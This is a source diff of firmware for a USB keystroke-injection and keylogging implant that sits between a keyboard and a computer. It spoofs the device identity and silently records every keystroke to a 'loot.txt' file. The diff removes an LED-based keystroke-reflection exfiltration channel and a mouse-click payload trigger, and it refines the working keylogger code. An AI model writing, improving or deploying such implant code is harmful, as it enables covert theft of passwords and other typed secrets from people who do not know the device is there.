@@ -18,11 +18,6 @@
 #define SHIFT   (0x80)
 #define ALTGR   (0x40)
 
-#define BIT_CHANGED(a, b, mask) (((a) ^ (b)) & (mask))
-#define LED_NUM_LOCK (1 << 0)
-#define LED_CAPS_LOCK (1 << 1)
-#define LED_SCROLL_LOCK (1 << 2)
-
 extern const uint8_t _asciimap[] PROGMEM;
 
 // USB Host object
@@ -37,14 +32,6 @@ uint8_t key;
 uint8_t tmp_key;
 int key_layout;
 int key_modifier_layout;
-uint8_t leds = 0;
-uint8_t last_leds = 0;
-uint8_t c_i = 0;
-uint8_t c = 0;
-
-// KEYSTROKE REFLECTION EXFIL 
-uint8_t const desc_hid_report_reflection[] = { TUD_HID_REPORT_DESC_KEYBOARD(HID_REPORT_ID(1)) };
-//Adafruit_USBD_HID usb_hid_reflection(desc_hid_report_reflection, sizeof(desc_hid_report_reflection), 2, false);
 
 void setup() {
   Serial.begin(115200);
@@ -54,15 +41,6 @@ void setup() {
     TinyUSBDevice.setID(vendor_id, product_id);
     TinyUSBDevice.setManufacturerDescriptor(manufacturer);
     TinyUSBDevice.setProductDescriptor(product); 
-  }
-
-  if (USBHOST_MOUSE) {
-    Mouse.begin();
-  }
-
-  if (KEYSTROKE_REFLECTION) {
-    //usb_hid_reflection.setReportCallback(NULL, hid_report_callback);
-    //usb_hid_reflection.begin();
   }
   
   Keyboard.begin();
@@ -79,27 +57,7 @@ void setup() {
   }
 
   if (KEYLOGGER_VIEWLOG) {
-    delay(10000);
-    File i = LittleFS.open("loot.txt", "r");
-    Serial.println("LOOT.TXT FILE:");
-    if (i) {
-      while (i.available()) {
-        Serial.write(i.read());
-      }
-      i.close();
-    }
-  }
-
-  if (REFLECTION_VIEWLOG) {
-    delay(10000);
-    File i = LittleFS.open("reflection.txt", "r");
-    Serial.println("REFLECTION.TXT FILE:");
-    if (i) {
-      while (i.available()) {
-        Serial.write(i.read());
-      }
-      i.close();
-    }
+    viewLogFile();
   }
 
   if (KEYLOGGER_DELETELOG) {
@@ -109,17 +67,6 @@ void setup() {
     if (i) {
       i.write("");
       Serial.println("KEYLOGGER DELETELOG: OK");
-      i.close();
-    }
-  }
-
-  if (REFLECTION_DELETELOG) {
-    delay(5500);
-    File i = LittleFS.open("reflection.txt", "w");
-    
-    if (i) {
-      i.write("");
-      Serial.println("REFLECTION DELETELOG: OK");
       i.close();
     }
   }
@@ -164,7 +111,7 @@ void loop() {
 }
 
 void setup1() { 
-  if (KEYLOGGER || USBHOST_MOUSE) {
+  if (KEYLOGGER) {
     Serial.println("Core1 setup to run TinyUSB host with pio-usb");
 
     uint32_t cpu_hz = clock_get_hz(clk_sys);
@@ -181,53 +128,13 @@ void setup1() {
 }
 
 void loop1() {
-  if (KEYLOGGER || USBHOST_MOUSE) {
+  if (KEYLOGGER) {
     USBHost.task();    
   }
 }
 
-void hid_report_callback(uint8_t report_id, hid_report_type_t report_type, uint8_t const* buffer, uint16_t bufsize) {
-  if (stage == 2) {
-    if (report_type == HID_REPORT_TYPE_OUTPUT) {
-      leds = buffer[0];
-      exfilReflection();
-    }
-  }
-  else if(stage == 1) {
-    if (report_type == HID_REPORT_TYPE_OUTPUT) {
-      leds = buffer[0];
-    }
-  }
-}
-
-void exfilReflection() { 
-  if (BIT_CHANGED(last_leds, leds, LED_NUM_LOCK)) {
-    c <<= 1;
-    c |= 1;
-    c_i++;
-  }
-  
-  else if (BIT_CHANGED(last_leds, leds, LED_CAPS_LOCK)) {
-    c <<= 1;
-    c |= 0;
-    c_i++;
-  }
-
-  if (c_i == 8) {
-    Serial.write(c);
-    File f = LittleFS.open("reflection.txt", "a");
-      if (f) {
-        f.write(c);
-        f.close();
-      }
-    c_i = 0;
-    c = 0;
-  }
-  last_leds = leds;
-}
-
 void tuh_hid_mount_cb(uint8_t dev_addr, uint8_t idx, uint8_t const* desc_report, uint16_t desc_len) {
-  if (KEYLOGGER || USBHOST_MOUSE) {
+  if (KEYLOGGER) {
     if ( !tuh_hid_receive_report(dev_addr, idx) ) {
       Serial.printf("Error: cannot request to receive report\r\n");
     }  
@@ -248,64 +155,6 @@ void tuh_hid_report_received_cb(uint8_t dev_addr, uint8_t idx, uint8_t const* re
         Serial.printf("Error: cannot request to receive report\r\n");
       }
     }
-
-    if (USBHOST_MOUSE) {
-      switch (itf_protocol) {
-        case HID_ITF_PROTOCOL_MOUSE:
-          process_boot_mouse_report( (hid_mouse_report_t const*) report );
-        break;
-      }
-
-      if ( !tuh_hid_receive_report(dev_addr, idx) ) {
-        Serial.printf("Error: cannot request to receive report\r\n");
-      }
-    }
-}
-
-void process_boot_mouse_report(hid_mouse_report_t const * report) {
-  
-  hid_mouse_report_t prev_report = { 0 };
-
-  uint8_t button_changed_mask = report->buttons ^ prev_report.buttons;
-  if ( button_changed_mask & report->buttons) {
-    Serial.printf(" %c%c%c ", report->buttons & MOUSE_BUTTON_LEFT   ? 'L' : '-', report->buttons & MOUSE_BUTTON_MIDDLE ? 'M' : '-', report->buttons & MOUSE_BUTTON_RIGHT  ? 'R' : '-');
-
-    if(report->buttons & MOUSE_BUTTON_LEFT) {
-      Mouse.press(MOUSE_LEFT);
-      delay(100);
-      Mouse.release(MOUSE_ALL);
-
-      if (PAYLOAD_RUN_CLICK == "MOUSE_BUTTON_LEFT") {
-        payload();
-        PAYLOAD_RUN_CLICK = "NONE";
-      }
-    }
-
-    else if(report->buttons & MOUSE_BUTTON_RIGHT) {
-      Mouse.press(MOUSE_RIGHT); 
-      delay(100);
-      Mouse.release(MOUSE_ALL);
-
-      if (PAYLOAD_RUN_CLICK == "MOUSE_BUTTON_RIGHT") {
-        payload();
-        PAYLOAD_RUN_CLICK = "NONE";
-      }
-    }
-
-    else if(report->buttons & MOUSE_BUTTON_MIDDLE) {
-      Mouse.press(MOUSE_MIDDLE);
-      delay(100);
-      Mouse.release(MOUSE_ALL);
-
-      if (PAYLOAD_RUN_CLICK == "MOUSE_BUTTON_MIDDLE") {
-        payload();
-        PAYLOAD_RUN_CLICK = "NONE";
-      }
-    }
-  }
-  
-  int8_t x; int8_t y; int8_t wheel;
-  Mouse.move(report->x, report->y, report->wheel);
 }
 
 void SetModifiersArd(void) {
@@ -389,6 +238,38 @@ void ProcessKeys(void) {
   }
 }
 
+void viewLogFile() {
+  if (KEYLOGGER_VIEWLOG) {
+    delay(10000);
+    File i = LittleFS.open("loot.txt", "r");
+    Serial.println("=== LOOT.TXT FILE CONTENT ===");
+    if (i) {
+      int byteCount = 0;
+      int charCount = 0;
+      
+      while (i.available()) {
+        uint8_t byteRead = i.read();
+        byteCount++;
+        
+        if (byteRead >= 32 && byteRead <= 126) {
+          Serial.print((char)byteRead);
+          charCount++;
+        } else {
+          Serial.print("[");
+          if (byteRead < 16) Serial.print("0");
+          Serial.print(byteRead, HEX);
+          Serial.print("]");
+        }
+      }
+      Serial.println();
+      Serial.println("=== END OF FILE ===");
+      i.close();
+    } else {
+      Serial.println("Error opening loot.txt");
+    }
+  }
+}
+
 void process_boot_kbd_report(hid_keyboard_report_t const *report) {
   if (KEYLOGGER) {
     hid_keyboard_report_t prev_report = { 0, 0, {0} };
@@ -411,15 +292,18 @@ void process_boot_kbd_report(hid_keyboard_report_t const *report) {
         if (report->keycode[i] ) {
           key = report->keycode[i];
           ProcessKeys();
-          key_layout = key,HEX;
+          key_layout = key;
 
-          for (int i = 0; i < 128; i++) {
-            if(pgm_read_byte(_asciimap + i) == key_layout){
-              Keyboard.write(i);
-              File f = LittleFS.open("loot.txt", "a");
-              if (f) {
-                f.write((const uint8_t*)&i, sizeof(i));
-                f.close();
+          for (int j = 0; j < 128; j++) {
+            if(pgm_read_byte(_asciimap + j) == key_layout){
+              Keyboard.write(j);
+              
+              if (j >= 32 && j <= 126) {
+                File f = LittleFS.open("loot.txt", "a");
+                if (f) {
+                  f.write((uint8_t)j);
+                  f.close();
+                }
               }
             }
           }
@@ -428,8 +312,6 @@ void process_boot_kbd_report(hid_keyboard_report_t const *report) {
     }
 
     bool current_modifier_state = (report->modifier != 0);
-
-    current_modifier_state = (report->modifier != 0);
 
     if (current_modifier_state != prev_modifier_state) {
       if (current_modifier_state) {
@@ -440,11 +322,8 @@ void process_boot_kbd_report(hid_keyboard_report_t const *report) {
         Serial.println("MODIFIER RELEASED");
         delay(100);
         Keyboard.releaseAll();
-        static bool key_pressed = false;
- 
         modifier_changed = true;
         mod = 0;
-
       }
       prev_modifier_state = current_modifier_state;
     }
@@ -454,22 +333,22 @@ void process_boot_kbd_report(hid_keyboard_report_t const *report) {
         if (report->keycode[i]) {
           key = report->keycode[i];
           SetModifiersArd();
-          key_modifier_layout = key|modifiersard,HEX;
+          key_modifier_layout = key|modifiersard;
 
-          for (int i = 0; i < 128; i++) {
-            if(pgm_read_byte(_asciimap + i) == key_modifier_layout){
-              File f = LittleFS.open("loot.txt", "a");
-              if (f) {
-                f.write((const uint8_t*)&i, sizeof(i));
-                f.close();
+          for (int j = 0; j < 128; j++) {
+            if(pgm_read_byte(_asciimap + j) == key_modifier_layout){
+              if (j >= 32 && j <= 126) {
+                File f = LittleFS.open("loot.txt", "a");
+                if (f) {
+                  f.write((uint8_t)j);
+                  f.close();
+                }
               }
             }
           }
-
           Keyboard.rawpress(key, mod);
           delay(100);
-          Keyboard.rawrelease(key, mod);
-        
+          Keyboard.rawrelease(key, mod);     
         }
       }
       modifier_changed = false;
